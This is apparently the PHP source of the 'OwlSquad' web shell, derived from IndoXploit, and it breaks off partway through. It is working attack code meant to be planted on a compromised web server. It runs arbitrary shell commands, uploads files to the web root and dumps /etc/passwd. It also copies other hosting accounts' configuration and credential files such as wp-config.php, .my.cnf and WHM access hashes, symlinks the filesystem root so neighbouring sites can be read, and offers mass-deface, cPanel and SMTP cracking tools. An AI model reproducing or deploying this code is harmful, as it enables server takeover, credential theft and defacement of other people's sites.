<html>
<head>
<title>OwlSquad</title>
<link rel="SHORTCUT ICON" href="https://png.icons8.com/metro/1600/ghost.png" type="image/png">
<meta name='author' content='OwlSquad'>
<meta charset="UTF-8">
<style type='text/css'>
html {
    background: black;
    color: #ffffff;
    font-family: 'Courier';
	font-size: 12px;
	width: 100%;
	line-height:1;
}
li {
	display: inline;
	margin: 5px;
	line-height:1;
	padding: 5px;
}
ul {
	line-height:1;
}
table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Courier';
	font-size: 12px;
	line-height:1;
}
.table_home, .th_home, .td_home {
	border: 1px solid #4c83af;
	line-height:1;
}
.td_home:hover 	{
	background-color: #464646;
}
.th_home	{
	background-color: #262626;
}
a.button {
  display: block;
  position: relative;
  float: left;
  width: 50px;
  height: 18px;
  padding-top: 4px;
  margin-right: 5px;
  text-align: center;
  color: #FFF;
  border-radius: 2px;
  transition: all 0.2s ;
}
.kntl {
  background: #363636;
}
.btnkntl .kntl a:hover {
  text-decoration: none;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: #4c83af;
	text-decoration: underline;
}
b {
	color: #4c83af;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #4c83af; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Courier';
	font-size: 12px;
}
textarea {
	border: 1px solid #4c83af;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Courier';
	font-size: 12px;
}
select {
	width: 152px;
	background: #000000; 
	color: #4c83af; 
	border: 1px solid #4c83af; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Courier';
	font-size: 12px;
}
option:hover {
	background: #4c83af;
	color: #000000;
}
</style>
</head>
<?php
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & all my friends.
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=#4c83af>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=#4c83af>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$d0mains = @file("/etc/named.conf");
            $users=@file('/etc/passwd');
        if($d0mains)
        { 
            $count;  
            foreach($d0mains as $d0main)
            {
                if(@ereg("zone",$d0main))
                {
                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
                    flush();
                    if(strlen(trim($domains[1][0])) > 2)
                    {
                        flush();
                        $count++;
                    } 
                }
            }
        }
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$pic = "https://www.fourjay.org/myphoto/f/96/964500_shocked-patrick-png.png";
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=#4c83af>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=#4c83af>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=#4c83af>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=#4c83af>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=#4c83af>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=#4c83af>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=maroon width=450px>$ds</font>" : "<font color=#4c83af>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<img src='".$pic."' width='160px' height='160px' style='float: left; margin-right: 10px;margin-top:10px;'>";
echo "<div style='border-top: 3px solid #4c83af;padding-top:15px;'>";
echo "<table style='padding-left=1px' align='left;'>";
echo "System:  <font color=white>".$kernel."</font><br>";
echo "Web Server : <font color=white>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "User : <font color=white>".$user."</font> (".$uid.") Group: <font color=white>".$group."</font> (".$gid.")<br>";
echo "Server IP : <font color=white>".$ip."</font> | <font color=red>Your IP</font> : <font color=white>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Websites : <font color=#4c83af>$count</font>  Domains<br>";
echo "HDD : <font color=white>$used</font> / <font color=white>$total</font> ( Free: <font color=white>$freespace</font> )<br>";
echo "PHP Version : ".phpversion()." <font color='white'> on</font> ".php_sapi_name()."<br>";
echo "Safe Mode : $sm<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br><br>";
echo '<a href="?" title="OwlSquad" class="button btnkntl kntl">Home</a>';
echo '<a href="?dir='.$dir.'&act=newfile" title="OwlSquad" class="button btnkntl kntl" style="width:70px;">New File</a>';
echo '<a href="?dir='.$dir.'&do=ds" title="OwlSquad" class="button btnFade kntl" style="width:130px;">Disable Functions</a>';
echo '<a href="?dir='.$dir.'&do=hapus" title="OwlSquad" class="button btnFade kntl" style="width:100px;">Delete & Kill</a><br><br><br>';
echo "</table></div>";
echo "<hr color='#4c83af'>";
echo "<center>";
echo "<ul>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=upload'>Upload</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=cmd'>Command</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=config'>Config</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=config2'>Config2</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=jumping'>Jumping</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=symlink'>Sym</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=sympy'>SymPy</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=smtp'>SMTP Crack</a> <font color='#4c83af'>]</font></li><br><br>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=cgi'>CGI Telnet</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=adminer'>Adminer</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=zoneh'>Zone-H</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=csrf'>CSRF</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=network'>Network</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a href='?dir=$dir&do=passwbypass'>Bypass /etc/Passwd</a> <font color='#4c83af'>]</font></li>";
echo "<li><font color='#4c83af'>[</font> <a style='color: red;' href='?logout=true'>Logout</a> <font color='#4c83af'>]</font></li><br>";
echo "</ul>";
echo "<hr color='#4c83af'>";
echo "$user@$ip > ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a style='color:#4c83af' href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "  [ ".w($dir, perms($dir))." ]<br>";
echo "<hr color='#4c83af'>";
echo "</center>";
if($_GET['logout'] == true) {
	unset($_SESSION[sha1($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=#4c83af>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=#4c83af>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passwd With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['do'] == 'config2') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("OwlSquad_config2", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("OwlSquad_config2/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_noname) {
			$user_config_dir = "/home/$user_noname/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_noname/.my.cnf" => "cpanel",
					"/home/$user_noname/.accesshash" => "WHM-accesshash",
					"/home/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_noname/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_noname/public_html/forum/config.php" => "phpBB",
					"/home/$user_noname/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_noname/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_noname/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_noname/public_html/configuration.php" => "Joomla",
					"/home/$user_noname/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_noname/public_html/wp-config.php" => "WordPress",
					"/home/$user_noname/public_html/admin/config.php" => "OpenCart",
					"/home/$user_noname/public_html/slconfig.php" => "Sitelok",
					"/home/$user_noname/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_noname/.my.cnf" => "cpanel",
					"/home1/$user_noname/.accesshash" => "WHM-accesshash",
					"/home1/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_noname/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_noname/public_html/forum/config.php" => "phpBB",
					"/home1/$user_noname/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_noname/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_noname/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_noname/public_html/configuration.php" => "Joomla",
					"/home1/$user_noname/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_noname/public_html/wp-config.php" => "WordPress",
					"/home1/$user_noname/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_noname/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_noname/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_noname/.my.cnf" => "cpanel",
					"/home2/$user_noname/.accesshash" => "WHM-accesshash",
					"/home2/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_noname/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_noname/public_html/forum/config.php" => "phpBB",
					"/home2/$user_noname/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_noname/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_noname/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_noname/public_html/configuration.php" => "Joomla",
					"/home2/$user_noname/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_noname/public_html/wp-config.php" => "WordPress",
					"/home2/$user_noname/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_noname/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_noname/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_noname/.my.cnf" => "cpanel",
					"/home3/$user_noname/.accesshash" => "WHM-accesshash",
					"/home3/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_noname/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_noname/public_html/forum/config.php" => "phpBB",
					"/home3/$user_noname/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_noname/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_noname/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_noname/public_html/configuration.php" => "Joomla",
					"/home3/$user_noname/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_noname/public_html/wp-config.php" => "WordPress",
					"/home3/$user_noname/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_noname/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_noname/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("OwlSquad_config2/$user_owl-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/OwlSquad_config2'><font color=#4c83af>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passwd ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("OwlSquad_sym",0777);
@chdir("OwlSquad_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex owl.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/OwlSquad_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("OwlSquad_sym",0777);
@chdir("OwlSquad_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex owl.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/OwlSquad_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("OwlSquad_sym",0777);@chdir("OwlSquad_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex owl.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='OwlSquad'>Server Symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/OwlSquad_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot Create Symlink</font></center>";
 }
 }
} elseif($_GET['do'] == 'ds') {
	echo "<center><h2>Disable Functions</h2>";
	echo"<textarea readonly style='width: 450px; height: 200px;' name='url'>";
	echo $ds;
	echo "</textarea><br></center>";
}
elseif($_GET['do'] == 'csrf') {
    echo "<h1>CSRF Exploiter</h1>
    <form method='post'>
URL: &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type='text' style='border:0;border-bottom:1px solid #292929; width:500px;' name='url' size='50' height='10' placeholder='http://127.0.0.1/[path]/upload.php' style='margin: 5px auto; padding-left: 5px;' required><br>
POST File: <input type='text' name='data' style='border:0;border-bottom:1px solid #292929; width:500px;' size='50' height='10' placeholder='Filedata / files[] / qqfile / userfile / dll' style='margin: 5px auto; padding-left: 5px;' required><br>
<br><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' class='kotak' type='submit' name='go' value='Lock!'>
</form>";
$url = $_POST['url'];
$data = $_POST['data'];
$submit = $_POST['go'];
if($submit) {
    echo "<br><form style='text-align:left' method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' type='submit' name='ok' class='kotak' value='Upload'>
    </form></div>";
}
    ;} elseif($_GET['do'] == 'sympy') {
	$sym_dir = mkdir('OwlSquad_sympy', 0755);
        chdir('OwlSquad_sympy');
	$file_sym = "sym.py";
